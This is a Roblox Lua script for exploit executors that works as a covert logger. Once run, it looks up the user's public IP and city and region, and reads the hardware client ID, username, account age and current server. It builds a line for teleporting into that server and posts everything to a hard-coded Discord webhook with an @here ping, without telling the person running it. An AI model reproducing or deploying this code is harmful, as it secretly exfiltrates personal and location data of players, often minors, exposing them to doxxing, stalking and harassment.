local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Analytics = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local function getHttpRequestFunc()
    if _G.http_request then
        return _G.http_request
    elseif _G.request then
        return _G.request
    elseif _G.HttpPost then
        return _G.HttpPost
    elseif _G.syn and _G.syn.request then
        return _G.syn.request
    end
    return nil
end

local httpRequest = getHttpRequestFunc()

local function safeHttpRequest(requestTable)
    if not httpRequest then
        warn("HTTP request function not available")
        return nil
    end
    local success, response = pcall(function()
        return httpRequest(requestTable)
    end)
    if success then
        return response
    else
        warn("HTTP request failed: ", response)
        return nil
    end
end

local readfile, writefile
if _G.readfile then readfile = _G.readfile end
if _G.writefile then writefile = _G.writefile end

local logFile = "executor_log.json"

local function getTimezone()
    local utc_time = os.date("!*t")
    local local_time = os.date("*t")
    local utc_seconds = os.time(utc_time)
    local local_seconds = os.time(local_time)
    local diff = local_seconds - utc_seconds
    local offset_hours = diff / 3600
    local popularTimezones = {
        [-12]="AoE", [-11]="SST", [-10]="HST", [-9]="AKST", [-8]="PST", [-7]="MST",
        [-6]="CST", [-5]="EST", [-4]="AST", [-3.5]="NST", [-3]="BRT", [-2]="GST",
        [-1]="AZOT", [0]="GMT", [1]="CET", [2]="EET", [3]="MSK", [3.5]="IRST",
        [4]="GST", [4.5]="AFT", [5]="PKT", [5.5]="IST", [5.75]="NPT", [6]="BST",
        [6.5]="MMT", [7]="WIB", [8]="CST", [8.75]="ACWST", [9]="JST",
        [9.5]="ACST", [10]="AEST", [10.5]="ACDT", [11]="AEDT", [12]="NZST", [12.75]="CHAST", [13]="PHOT", [14]="LINT"
    }
    local rounded_offset = math.floor((diff / 3600) * 2 + 0.5) / 2
    return popularTimezones[rounded_offset] or ("UTC" .. (rounded_offset >= 0 and "+" or "") .. rounded_offset)
end

local function getPublicIP()
    local res = safeHttpRequest({ Url = "https://api.ipify.org", Method = "GET" })
    if res and res.Body then
        return res.Body
    end
    return "Unknown"
end

local function getLocationInfo(ip)
    local res = safeHttpRequest({ Url = "http://ip-api.com/json/"..ip, Method = "GET" })
    if res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        return data.city or "Unknown", data.region or "Unknown"
    end
    return "Unknown", "Unknown"
end

local function getHWID()
    if Analytics and Analytics.GetClientId then
        return Analytics:GetClientId() or "Unknown"
    end
    return "Unknown"
end

local function detectExecutor()
    if identifyexecutor then return identifyexecutor()
    elseif getexecutorname then return getexecutorname()
    elseif _G.syn and _G.syn.request then return "Synapse X"
    end
    return "Unknown"
end

local execName = detectExecutor()
local publicIP = getPublicIP()
local city, state = getLocationInfo(publicIP)
local timezone = getTimezone()
local hwid = getHWID()

local function readLog()
    if not readfile then return {} end
    local ok, data = pcall(readfile, logFile)
    if ok and data ~= "" then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, data)
        if ok2 then return decoded end
    end
    return {}
end

local function writeLog(data)
    if not writefile then return end
    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, data)
    if ok then pcall(writefile, logFile, encoded) end
end

local previousLog = readLog()
previousLog[LocalPlayer.Name] = (previousLog[LocalPlayer.Name] or 0) + 1

local accountAge = LocalPlayer.AccountAge
local currentTimeUTC = os.date("!*t")
local currentSecondsUTC = os.time(currentTimeUTC)
local localTime = os.date("*t")
local localSeconds = os.time(localTime)
local offsetSeconds = localSeconds - currentSecondsUTC

local accountCreationDate = os.date("%Y-%m-%d", os.time() - accountAge * 86400)
local currentDate = os.date("%Y-%m-%d")
local currentTime = os.date("%H:%M:%S", os.time() + offsetSeconds)

local placeId = game.PlaceId
local jobId = game.JobId

local gameInfo = MarketplaceService:GetProductInfo(placeId)
local gameName = gameInfo and gameInfo.Name or "Unknown"
local profileLink = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"
local activePlayers = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers
local playerPing = LocalPlayer:GetNetworkPing() or 0
local teleportScript = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], placeId, jobId)

local logEntry = {
    Username = LocalPlayer.Name,
    DisplayName = LocalPlayer.DisplayName,
    GameName = gameName,
    ProfileLink = profileLink,
    ServerPlayers = activePlayers.."/"..maxPlayers,
    PlayerPingMS = math.floor(playerPing),
    Time = currentDate.." "..currentTime,
    HWID = hwid,
    IP = publicIP,
    City = city,
    State = state,
    Timezone = timezone,
    AccountCreation = accountCreationDate,
    AccountAge = accountAge,
    Executor = execName,
    Executions = previousLog[LocalPlayer.Name],
    TeleportScript = teleportScript
}

previousLog[LocalPlayer.Name] = previousLog[LocalPlayer.Name] + 1
previousLog["Logs"] = previousLog["Logs"] or {}
table.insert(previousLog["Logs"], logEntry)

writeLog(previousLog)

local webhookData = {
    content = "@here",
    username = LocalPlayer.Name,
    avatar_url = "https://tse4.mm.bing.net/th?id=OIP.nJ7S63mDf0rdL9tAEPZjYAHaJQ&pid=Api&P=0&h=220",
    embeds = {{
        title = "Player Execution Info",
        fields = {
            {name="Display Name", value=LocalPlayer.DisplayName, inline=true},
            {name="Username", value=LocalPlayer.Name, inline=true},
            {name="Game Name", value=gameName, inline=true},
            {name="Server Players", value=activePlayers.."/"..maxPlayers, inline=true},
            {name="Player Ping (ms)", value=tostring(math.floor(playerPing)), inline=true},
            {name="IP Address", value=publicIP, inline=false},
            {name="City", value=city, inline=true},
            {name="State", value=state, inline=true},
            {name="Account Creation", value=accountCreationDate, inline=false},
            {name="Account Age", value=tostring(accountAge), inline=false},
            {name="Date", value=currentDate, inline=false},
            {name="Time", value=currentTime, inline=false},
            {name="Timezone", value=timezone, inline=false},
            {name="HWID", value=hwid, inline=false},
            {name="Executor", value=execName, inline=true},
            {name="Execution Count", value=tostring(previousLog[LocalPlayer.Name]), inline=true},
            {name="Teleport Script", value=teleportScript, inline=false},
            {name="Profile Link", value="[Profile]("..profileLink..")", inline=false}
        }
    }}
}

local success, err = pcall(function()
    if httpRequest then
        local response = httpRequest({
            Url = "https://discord.com/api/webhooks/1550700524024631357/VU44Ft8uTNQ2FcoNpVSjLw03uI9x2BuE7YT5y4A33UEXH8A0QwGrOpfzjdPdrSisqzuC",
            Method = "POST",
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(webhookData),
        })
        if not response then
            warn("Failed to send webhook")
        end
    else
        warn("No HTTP request function")
    end
end)

if not success then
    warn("Error sending webhook:", err)
end
